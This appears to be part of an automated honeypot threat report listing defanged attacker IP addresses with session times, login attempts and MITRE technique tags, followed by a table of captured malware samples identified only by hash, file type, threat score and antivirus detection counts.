| `121.228.250[.]223` | **2** | 2026-10-11 13:59 | 2026-10-11 14:14 | 3m | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | **2** | 2026-10-11 08:41 | 2026-10-11 10:34 | 1m | 0 | `T1592` | 🟢 LOW |
| `138.2.106[.]209` | **2** | 2026-10-11 05:59 | 2026-10-11 06:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-10-11 15:09 | 2026-10-11 16:08 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-11 06:16 | 2026-10-11 08:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]14` | **2** | 2026-10-11 11:58 | 2026-10-11 12:22 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.204.138[.]198` | **2** | 2026-10-11 00:57 | 2026-10-11 02:32 | 1m | 0 | `T1592` | 🟢 LOW |
| `100.59.0[.]92` | 1 | 2026-10-11 01:36 | 2026-10-11 01:36 | 2s | 0 | `T1592` | 🟢 LOW |
| `101.126.26[.]93` | 1 | 2026-10-11 04:38 | 2026-10-11 04:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.96.202[.]177` | 1 | 2026-10-11 04:58 | 2026-10-11 05:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.159.2[.]113` | 1 | 2026-10-11 06:48 | 2026-10-11 06:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]2` | 1 | 2026-10-11 04:39 | 2026-10-11 04:39 | 10s | 0 | `T1592` | 🟢 LOW |
| `104.152.52[.]135` | 1 | 2026-10-11 15:16 | 2026-10-11 15:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.152.52[.]204` | 1 | 2026-10-11 15:17 | 2026-10-11 15:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.155.92[.]149` | 1 | 2026-10-11 02:35 | 2026-10-11 02:35 | 3s | 0 | `T1592` | 🟢 LOW |
| `104.168.99[.]216` | 1 | 2026-10-11 06:10 | 2026-10-11 06:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.199.98[.]238` | 1 | 2026-10-11 02:41 | 2026-10-11 02:41 | 4s | 0 | `T1592` | 🟢 LOW |
| `106.75.222[.]86` | 1 | 2026-10-11 04:54 | 2026-10-11 04:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]104` | 1 | 2026-10-11 14:44 | 2026-10-11 14:44 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]117` | 1 | 2026-10-11 01:31 | 2026-10-11 01:31 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]160` | 1 | 2026-10-11 07:08 | 2026-10-11 07:08 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]161` | 1 | 2026-10-11 15:21 | 2026-10-11 15:21 | 7s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]46` | 1 | 2026-10-11 13:06 | 2026-10-11 13:06 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]47` | 1 | 2026-10-11 09:30 | 2026-10-11 09:31 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.95.98[.]221` | 1 | 2026-10-11 13:11 | 2026-10-11 13:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `112.168.176[.]15` | 1 | 2026-10-11 09:43 | 2026-10-11 09:44 | 30s | 0 | `T1592` | 🟢 LOW |
| `115.190.184[.]184` | 1 | 2026-10-11 14:00 | 2026-10-11 14:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.191.34[.]239` | 1 | 2026-10-11 04:34 | 2026-10-11 04:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.55.245[.]26` | 1 | 2026-10-11 01:24 | 2026-10-11 01:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.50.199[.]249` | 1 | 2026-10-11 05:02 | 2026-10-11 05:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.122.147[.]49` | 1 | 2026-10-11 04:46 | 2026-10-11 04:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.194.248[.]142` | 1 | 2026-10-11 14:12 | 2026-10-11 14:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.196.163[.]21` | 1 | 2026-10-11 13:40 | 2026-10-11 13:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.26.202[.]34` | 1 | 2026-10-11 03:33 | 2026-10-11 03:33 | 8s | 0 | `T1592` | 🟢 LOW |
| `120.48.17[.]39` | 1 | 2026-10-11 04:41 | 2026-10-11 04:43 | 90s | 0 | `T1592` | 🟢 LOW |
| `121.142.204[.]4` | 1 | 2026-10-11 02:37 | 2026-10-11 02:37 | 16s | 0 | `T1592` | 🟢 LOW |
| `122.117.178[.]131` | 1 | 2026-10-11 04:36 | 2026-10-11 04:36 | 12s | 0 | `T1592` | 🟢 LOW |
| `122.199.107[.]20` | 1 | 2026-10-11 09:10 | 2026-10-11 09:11 | 13s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-11 02:11 | 2026-10-11 02:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-11 05:03 | 2026-10-11 05:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]32` | 1 | 2026-10-11 11:42 | 2026-10-11 11:43 | 53s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-11 06:10 | 2026-10-11 06:11 | 45s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-11 14:29 | 2026-10-11 14:30 | 46s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-11 10:03 | 2026-10-11 10:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-11 12:03 | 2026-10-11 12:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-11 14:07 | 2026-10-11 14:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-11 16:12 | 2026-10-11 16:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.59.151[.]17` | 1 | 2026-10-11 11:41 | 2026-10-11 11:42 | 20s | 0 | `T1592` | 🟢 LOW |
| `14.29.201[.]186` | 1 | 2026-10-11 14:11 | 2026-10-11 14:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.54.150[.]140` | 1 | 2026-10-11 07:39 | 2026-10-11 07:39 | 8s | 0 | `T1592` | 🟢 LOW |
| `143.202.139[.]52` | 1 | 2026-10-11 03:35 | 2026-10-11 03:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.104.210[.]105` | 1 | 2026-10-11 13:35 | 2026-10-11 13:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.235.41[.]245` | 1 | 2026-10-11 05:56 | 2026-10-11 05:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]39` | 1 | 2026-10-11 01:08 | 2026-10-11 01:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.202.119[.]34` | 1 | 2026-10-11 12:57 | 2026-10-11 12:58 | 29s | 0 | `T1592` | 🟢 LOW |
| `177.238.25[.]19` | 1 | 2026-10-11 04:51 | 2026-10-11 04:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `178.128.3[.]195` | 1 | 2026-10-11 07:32 | 2026-10-11 07:32 | 8s | 0 | `T1592` | 🟢 LOW |
| `178.132.198[.]200` | 1 | 2026-10-11 16:41 | 2026-10-11 16:41 | 15s | 0 | `T1592` | 🟢 LOW |
| `179.209.44[.]250` | 1 | 2026-10-11 16:11 | 2026-10-11 16:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.191.236[.]38` | 1 | 2026-10-11 14:04 | 2026-10-11 14:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]17` | 1 | 2026-10-11 00:59 | 2026-10-11 00:59 | 10s | 0 | `T1592` | 🟢 LOW |
| `185.99.5[.]222` | 1 | 2026-10-11 15:13 | 2026-10-11 15:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `186.22.87[.]224` | 1 | 2026-10-11 07:27 | 2026-10-11 07:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `187.204.160[.]92` | 1 | 2026-10-11 15:18 | 2026-10-11 15:18 | 25s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-11 03:51 | 2026-10-11 03:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-11 07:48 | 2026-10-11 07:49 | 43s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-11 11:28 | 2026-10-11 11:28 | 6s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-11 16:13 | 2026-10-11 16:13 | 2s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]204` | 1 | 2026-10-11 15:25 | 2026-10-11 15:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]217` | 1 | 2026-10-11 14:37 | 2026-10-11 14:37 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]218` | 1 | 2026-10-11 16:14 | 2026-10-11 16:14 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]232` | 1 | 2026-10-11 16:42 | 2026-10-11 16:42 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.102.110[.]201` | 1 | 2026-10-11 11:31 | 2026-10-11 11:31 | 9s | 0 | `T1592` | 🟢 LOW |
| `200.122.66[.]228` | 1 | 2026-10-11 03:19 | 2026-10-11 03:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.37.103[.]36` | 1 | 2026-10-11 01:14 | 2026-10-11 01:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `200.59.72[.]61` | 1 | 2026-10-11 13:22 | 2026-10-11 13:22 | 10s | 0 | `T1592` | 🟢 LOW |
| `202.150.156[.]19` | 1 | 2026-10-11 13:47 | 2026-10-11 13:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.194.41[.]69` | 1 | 2026-10-11 05:14 | 2026-10-11 05:14 | 28s | 0 | `T1592` | 🟢 LOW |
| `213.177.179[.]80` | 1 | 2026-10-11 05:04 | 2026-10-11 05:04 | 10s | 0 | `T1592` | 🟢 LOW |
| `213.230.87[.]36` | 1 | 2026-10-11 05:12 | 2026-10-11 05:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `216.226.77[.]20` | 1 | 2026-10-11 08:51 | 2026-10-11 08:52 | 14s | 0 | `T1592` | 🟢 LOW |
| `216.244.247[.]188` | 1 | 2026-10-11 06:41 | 2026-10-11 06:42 | 10s | 0 | `T1592` | 🟢 LOW |
| `218.152.243[.]192` | 1 | 2026-10-11 08:34 | 2026-10-11 08:34 | 24s | 0 | `T1592` | 🟢 LOW |
| `218.4.214[.]115` | 1 | 2026-10-11 06:22 | 2026-10-11 06:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.120.83[.]75` | 1 | 2026-10-11 14:10 | 2026-10-11 14:11 | 10s | 0 | `T1592` | 🟢 LOW |
| `220.124.230[.]68` | 1 | 2026-10-11 12:36 | 2026-10-11 12:37 | 30s | 0 | `T1592` | 🟢 LOW |
| `220.71.232[.]148` | 1 | 2026-10-11 14:10 | 2026-10-11 14:10 | 18s | 0 | `T1592` | 🟢 LOW |
| `221.144.221[.]177` | 1 | 2026-10-11 13:52 | 2026-10-11 13:52 | 28s | 0 | `T1592` | 🟢 LOW |
| `222.6.218[.]108` | 1 | 2026-10-11 10:18 | 2026-10-11 10:19 | 11s | 0 | `T1592` | 🟢 LOW |
| `3.14.73[.]254` | 1 | 2026-10-11 16:07 | 2026-10-11 16:07 | 1s | 0 | `T1592` | 🟢 LOW |
| `31.223.60[.]33` | 1 | 2026-10-11 12:44 | 2026-10-11 12:45 | 21s | 0 | `T1592` | 🟢 LOW |
| `31.40.204[.]121` | 1 | 2026-10-11 05:05 | 2026-10-11 05:05 | 15s | 0 | `T1592` | 🟢 LOW |
| `31.40.204[.]130` | 1 | 2026-10-11 04:31 | 2026-10-11 04:31 | 15s | 0 | `T1592` | 🟢 LOW |
| `34.77.173[.]19` | 1 | 2026-10-11 03:24 | 2026-10-11 03:24 | 1s | 0 | `T1592` | 🟢 LOW |
| `34.77.52[.]202` | 1 | 2026-10-11 02:40 | 2026-10-11 02:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.78.68[.]41` | 1 | 2026-10-11 02:54 | 2026-10-11 02:54 | 1s | 0 | `T1592` | 🟢 LOW |
| `35.144.180[.]31` | 1 | 2026-10-11 12:36 | 2026-10-11 12:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `36.50.134[.]86` | 1 | 2026-10-11 06:26 | 2026-10-11 06:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `37.52.64[.]194` | 1 | 2026-10-11 02:01 | 2026-10-11 02:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `40.119.45[.]138` | 1 | 2026-10-11 10:10 | 2026-10-11 10:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `40.124.82[.]68` | 1 | 2026-10-11 14:54 | 2026-10-11 14:54 | 10s | 0 | `T1592` | 🟢 LOW |
| `42.0.81[.]25` | 1 | 2026-10-11 10:24 | 2026-10-11 10:25 | 24s | 0 | `T1592` | 🟢 LOW |
| `45.136.117[.]21` | 1 | 2026-10-11 14:29 | 2026-10-11 14:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-10-11 13:04 | 2026-10-11 13:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-10-11 04:05 | 2026-10-11 04:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-10-11 10:06 | 2026-10-11 10:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]61` | 1 | 2026-10-11 01:43 | 2026-10-11 01:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-10-11 03:44 | 2026-10-11 03:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]197` | 1 | 2026-10-11 01:41 | 2026-10-11 01:41 | 3s | 0 | `T1592` | 🟢 LOW |
| `45.56.79[.]53` | 1 | 2026-10-11 02:44 | 2026-10-11 02:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.91.64[.]6` | 1 | 2026-10-11 01:46 | 2026-10-11 01:47 | 31s | 0 | `T1592` | 🟢 LOW |
| `46.150.65[.]132` | 1 | 2026-10-11 13:25 | 2026-10-11 13:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.251.59[.]80` | 1 | 2026-10-11 16:20 | 2026-10-11 16:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-10-11 04:49 | 2026-10-11 04:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.108.202[.]22` | 1 | 2026-10-11 12:05 | 2026-10-11 12:06 | 25s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]242` | 1 | 2026-10-11 01:06 | 2026-10-11 01:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]152` | 1 | 2026-10-11 11:47 | 2026-10-11 11:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]107` | 1 | 2026-10-11 01:30 | 2026-10-11 01:30 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]144` | 1 | 2026-10-11 05:40 | 2026-10-11 05:40 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]48` | 1 | 2026-10-11 01:53 | 2026-10-11 01:53 | 2s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]80` | 1 | 2026-10-11 01:42 | 2026-10-11 01:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]143` | 1 | 2026-10-11 03:51 | 2026-10-11 03:51 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]183` | 1 | 2026-10-11 05:35 | 2026-10-11 05:35 | 19s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]210` | 1 | 2026-10-11 05:36 | 2026-10-11 05:36 | 17s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]182` | 1 | 2026-10-11 05:35 | 2026-10-11 05:35 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]222` | 1 | 2026-10-11 14:25 | 2026-10-11 14:25 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]46` | 1 | 2026-10-11 05:36 | 2026-10-11 05:36 | 15s | 0 | `T1592` | 🟢 LOW |
| `72.14.178[.]148` | 1 | 2026-10-11 12:34 | 2026-10-11 12:34 | 1s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-11 03:17 | 2026-10-11 03:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-11 06:29 | 2026-10-11 06:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-11 15:35 | 2026-10-11 15:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-10-11 08:21 | 2026-10-11 08:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-10-11 15:04 | 2026-10-11 15:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.26.130[.]207` | 1 | 2026-10-11 03:03 | 2026-10-11 03:03 | 13s | 0 | `T1592` | 🟢 LOW |
| `8.156.83[.]235` | 1 | 2026-10-11 15:42 | 2026-10-11 15:42 | 4s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]29` | 1 | 2026-10-11 10:26 | 2026-10-11 10:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]43` | 1 | 2026-10-11 10:24 | 2026-10-11 10:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.54.31[.]38` | 1 | 2026-10-11 07:43 | 2026-10-11 07:43 | 1s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]132` | 1 | 2026-10-11 14:04 | 2026-10-11 14:04 | 1s | 0 | `T1592` | 🟢 LOW |
| `87.249.61[.]131` | 1 | 2026-10-11 02:13 | 2026-10-11 02:13 | 12s | 0 | `T1592` | 🟢 LOW |
| `93.126.92[.]39` | 1 | 2026-10-11 09:56 | 2026-10-11 09:57 | 13s | 0 | `T1592` | 🟢 LOW |
| `93.158.90[.]135` | 1 | 2026-10-11 13:39 | 2026-10-11 13:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.158.90[.]141` | 1 | 2026-10-11 13:39 | 2026-10-11 13:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.158.90[.]162` | 1 | 2026-10-11 13:39 | 2026-10-11 13:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.9.239[.]246` | 1 | 2026-10-11 03:48 | 2026-10-11 03:48 | 37s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]57` | 1 | 2026-10-11 07:39 | 2026-10-11 07:40 | 30s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]57` | 1 | 2026-10-11 10:23 | 2026-10-11 10:23 | 29s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
